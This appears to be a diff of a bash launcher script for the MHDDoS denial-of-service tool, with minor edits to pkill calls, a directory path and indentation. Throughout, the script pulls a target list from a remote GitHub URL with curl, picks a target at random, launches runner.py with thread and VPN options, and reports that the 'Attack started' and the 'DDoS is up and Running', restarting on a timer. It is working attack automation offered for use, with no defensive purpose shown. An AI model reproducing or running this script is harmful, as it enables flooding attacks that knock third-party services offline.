@@ -8,7 +8,7 @@ ulimit -n 1048576
 
 #Just in case kill previous copy of mhddos_proxy
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
-pkill runner.py &
+pkill runner.py
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
 
 # git config --global --add safe.directory /home/${USER}/auto_mhddos_alexnest
@@ -76,7 +76,7 @@ do
 	fi
 	
 	
-	cd ~/auto_mhddos_alexnest
+	cd ~/runner_for_mac
    	num=$(git pull | grep -c 'Already')
    	echo -e "$num"
    	
@@ -98,16 +98,16 @@ do
 	i=`expr $(shuf -i 1-$list_size -n 1) \* 60`
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
       
-    echo -e "\n I = $i"
-    # Filter and only get lines that not start with "#". Then get one target from that filtered list.
-    cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
+   	echo -e "\n I = $i"
+    	# Filter and only get lines that not start with "#". Then get one target from that filtered list.
+    	cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
            
-    echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
-    echo -e "python3 runner.py $cmd_line --rpc $rpc -t $threads $debug"
+    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
+    	echo -e "python3 runner.py $cmd_line --rpc $rpc -t $threads $debug"
             
-    cd ~/mhddos_proxy
-    python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug&
-    echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
+    	cd ~/mhddos_proxy
+    	python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug&
+    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
 
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
    	sleep $restart_interval
@@ -115,7 +115,7 @@ do
    	
    	#Just in case kill previous copy of mhddos_proxy
    	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
-   	pkill runner.py &
+   	pkill runner.py
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
 	
    	no_ddos_sleep=`expr $(shuf -i 1-3 -n 1) \* 60`
